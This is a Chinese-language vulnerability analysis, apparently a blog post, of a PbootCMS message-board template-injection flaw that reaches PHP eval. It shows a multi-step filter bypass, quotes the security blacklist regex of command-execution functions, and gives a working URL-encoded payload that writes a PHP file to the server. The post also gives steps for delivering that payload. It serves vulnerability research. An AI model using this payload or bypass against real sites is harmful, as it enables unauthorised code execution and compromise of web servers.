首先我们明确，我们的payload要伪装成`pboot:if`标签的样子。
对第一处MessageController.php的str_replace()的绕过较为容易，只需要双写`pboot:if`即可，重点在于构造既符合parserIfLabel($content)中pattern的要求，又能实现绕过其内部安全检查的payload。
parserIfLabel($content)中的$pattern是这样的`/\{pboot:if\(([^}^\$]+)\)\}([\s\S]*?)\{\/pboot:if\}/`，所以我们的payload的形式可以是如下的样子：{pbootpboot:if:if(xxx)}yyy{/pbootpboot:if:if}。接下来我们先发一个这样的留言看看情况，MessageController的index()下断，
可见第三次进入for循环时，$field_data即为我们的留言内容，
可以看到，在经历了一次，str_replace()操作后，payload正好成了if标签的样子，继续向下走，
此时要将包含了payload的$data数组传给addMessage()，跟进去看看，
继续跟进insert，在经历了大量程序性操作之后，我们来到了insert()的最后一步，
可以看到最后在执行数据库操作之前，又进行了一次str_replace('pboot:if')操作，最终效果如下，
为了解决这个问题，我们要二次双写，写成{pbootpbootpboot:if:if:if(xxx)}yyy{/pbootpbootpboot:if:if:if}，效果如下。
接下来从管理员页面将这条留言设置为可展示，我们在parserIfLabel()中下断并刷新一下留言板。
可以看到，开标签{pbootpbootpboot:if:if:if(xxx)}中括号内部的字符xxx被收入进了$matches[1]。
继续向下走，
xxx正在接受安全检查，因为xxx只是个demo，顺利过关，最后顺利来到eval。
###### （2）绕过安全检查
从上一小节中我们可以看到，开标签{pbootpbootpboot:if:if:if(xxx)}中括号内部的字符xxx被收入进了$matches[1]并最终进入eval，接下来我们要考虑的就是如何让恶意的字符串进入eval。安全检查主要有两关：一是带有函数的条件语句进行安全校验，函数存在或匹配到完整的eval字符串，且$value不在白名单里则将$danger置为true，就无法进入后面的eval；
二是过滤了很多特殊字符串，导致很多常用的可用于恶意功能的函数不能用了，
这些字符串有
    (\$_GET\[)|(\$_POST\[)|(\$_REQUEST\[)|(\$_COOKIE\[)|(\$_SESSION\[)|(file_put_contents)|(fwrite)|(phpinfo)|(base64_decode)|(`)|(shell_exec)|(eval)|(system)|(exec)|(passthru)
此处拦截的目标有写文件的函数、phpinfo和命令执行的函数。
别的不说，正常情况下，第一关就有些难度，但凡有个不在白名单里的函数，function_exists($value)都为true，!
in_array($value, $white_fun)也为true，这样一来$danger肯定为true了。
到此，如果没有别的办法，利用就算是失败了，不过我们有P神的[提示](https://www.leavesongs.com/PENETRATION/dynamic-features-and-webshell-tricks-in-php.html)（可能并不完全贴合）。在函数调用时，在括号前面增加控制字符（[\x00-\x20]）不会影响函数执行。
针对这里的正则匹配，如果我们构造`func\x01()`，应该是可以绕过检测的。
有如下demo，
    ")';
        $matches =  '{pbootpbootpboot:if:if:if('.$matches.')}yyy{/pbootpbootpboot:if:if:if}';
    //    print_r($matches);
        if (preg_match_all('/([\w]+)([\\\s]+)?\(/i', $matches, $matches2)) {
            foreach ($matches2[1] as $value) {
                if ((function_exists($value) || preg_match('/^eval$/i', $value)) && ! in_array($value, $white_fun)) {
                    $danger = 1;
                    break;
                }
            }
        }
        echo "\n";
        print_r($danger);
        echo "\n";
        echo urlencode($matches);
    /*
    0
    %7Bpbootpbootpboot%3Aif%3Aif%3Aif%28fputs%01%28fopen%01%28%22info.php%22%2C%22w%22%29%2C%22%3C%3Fphp+%22.chr%01%28112%29.chr%01%28104%29.chr%01%28112%29.chr%01%28105%29.chr%01%28110%29.chr%01%28102%29.chr%01%28111%29%01.%22%28%29%3B%3F%3E%22%29%29%7Dyyy%7B%2Fpbootpbootpboot%3Aif%3Aif%3Aif%7D
    */
改包，将content字段改为payload即可，
然后在后台将此留言置为可显示，然后访问相应文件即可。
### 三、参考链接
解释一下为什么我猜测出问题的版本是 _2.0.7_ ：因为我在 _2.0.8_ 与 _2.0.9_ 的比对中没看出对 _2.0.8_
的留言板功能的明显改动（大部分改动是关于百度快速推送的），虽然 _2.0.9_ 的更新中明确写了如下一句话，
但是可能修复的不是这个漏洞，后面又对比了 _2.0.7_ 版本和 _2.0.8_
版本的差异，发现最有意义的差异之一便是2.0.8版本中采用了preg_replace_r()函数来彻底消除IF标签，这样的话，留言板应该就不会解析if标签，也就不会出现问题了。另外，查看了一下，Pbootcms的其它CVE的代码版本号都比较早了，直觉上讲与此漏洞没有关系，这都是猜测，不知对否，希望师傅们指正。当然这个分析漏洞的过程更有意义。